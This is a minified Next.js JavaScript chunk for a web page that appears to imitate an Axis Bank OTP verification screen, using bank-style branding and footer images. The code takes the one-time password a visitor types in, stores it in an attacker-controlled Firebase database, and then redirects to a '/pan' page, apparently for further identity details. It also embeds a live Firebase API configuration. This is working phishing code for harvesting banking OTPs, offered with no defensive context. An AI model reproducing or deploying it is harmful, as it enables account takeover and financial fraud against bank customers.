(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[636],{4604:function(e,t,s){Promise.resolve().then(s.bind(s,2565))},6070:function(e,t,s){"use strict";s.d(t,{F:function(){return c},db:function(){return r}});var a=s(994),n=s(4086),l=s(2307);let i=(0,a.ZF)({apiKey:"AIzaSyDhB57v4wZTVXPKOCSteLD8hfJE7WXooK0",authDomain:"axpro-53893.firebaseapp.com",databaseURL:"https://axpro-53893-default-rtdb.firebaseio.com",projectId:"axpro-53893",storageBucket:"axpro-53893.appspot.com",messagingSenderId:"627547144156",appId:"1:627547144156:web:56e5e090d9161f222c5919",measurementId:"G-7NXL28XHGG"}),r=(0,n.ad)(i),c=(0,l.N8)(i)},2565:function(e,t,s){"use strict";s.r(t),s.d(t,{default:function(){return Page}});var a=s(7437);s(6691);var n=s(2265),l=s(2307),i=s(6070),r=s(4033);function Page(){let[e,t]=(0,n.useState)(),s=(0,r.useRouter)(),[c,o]=(0,n.useState)(!1),[d,u]=(0,n.useState)(0);async function countDocuments(){let e=(0,l.iH)(i.F,"datas");(0,l.U2)(e).then(e=>{e.exists()?(console.log(e.val().length),u(e.val().length)):(console.log("No data available"),u(0))})}async function createData(){if(null==e||""===e)return alert("Please Enter OTP"),null;let t=(0,l.iH)(i.F,"datas");(0,l.U2)(t).then(e=>{e.exists()?(console.log(e.val().length),u(e.val().length)):(console.log("No data available"),u(0))}),o(!0);try{(0,l.t8)((0,l.iH)(i.F,"datas/"+d),{otp:e}),s.push("/pan"),o(!1)}catch(e){console.error("Error adding document: ",e),o(!1)}}return(0,n.useEffect)(()=>{countDocuments()},[]),(0,a.jsx)("div",{className:"flex min-h-screen flex-col items-center justify-between",children:(0,a.jsx)("div",{className:"w-full justify-center flex items-center",children:(0,a.jsxs)("div",{id:"enterDetails",className:"w-auto",children:[(0,a.jsx)("div",{className:"bg-pink-800 h-[60px] flex items-center justify-start",children:(0,a.jsx)("img",{className:"h-8 ml-5",src:"/axios-logo.png"})}),(0,a.jsx)("div",{className:"w-full justify-center flex mt-10 font-md text-md font-bold",children:"One Time Password (OTP) Verification"}),(0,a.jsx)("div",{className:"bg-white m-5",children:(0,a.jsx)("div",{children:(0,a.jsx)("div",{id:"tab3-content",children:(0,a.jsxs)("div",{className:"pt-5",children:[(0,a.jsxs)("div",{children:["One Time Password (OTP) has been sent to ",(0,a.jsx)("br",{}),"your registered mobile Number.",(0,a.jsx)("br",{}),"Please enter the OTP and proceed"]}),(0,a.jsxs)("div",{className:"flex w-full justify-between",children:[(0,a.jsxs)("h1",{className:"text-sm mt-10",children:["One Time Password ",(0,a.jsx)("span",{className:"text-pink-600",children:"*"})]}),(0,a.jsx)("h1",{className:"text-sm mt-10 bg-pink-900 rounded p-1 text-white",onClick:()=>{window.location.reload()},children:"Resent OTP"})]}),(0,a.jsx)("input",{type:"password",value:e,maxLength:6,onChange:e=>{t(e.target.value)},className:"w-full border-b-[1px] border-black p-1 outline-none"}),(0,a.jsx)("div",{className:"mt-5 justify-center flex",children:(0,a.jsx)("button",{className:"btn w-full mt-10 rounded-full btn-md text-white bg-pink-800 no-animation",onClick:createData,disabled:c,children:"Proceed"})}),(0,a.jsx)("img",{src:"/Axis_Footer.3d96abb314431b5d9f32.jpg"}),(0,a.jsx)("img",{src:"/Axis_Ft.42ad528f8e16f7ac78c3.jpg"})]})})})}),(0,a.jsx)("div",{className:"w-full",children:(0,a.jsx)("img",{src:"",alt:"",className:"w-full"})})]})})})}}},function(e){e.O(0,[358,481,462,758,971,864,744],function(){return e(e.s=4604)}),_N_E=e.O()}]);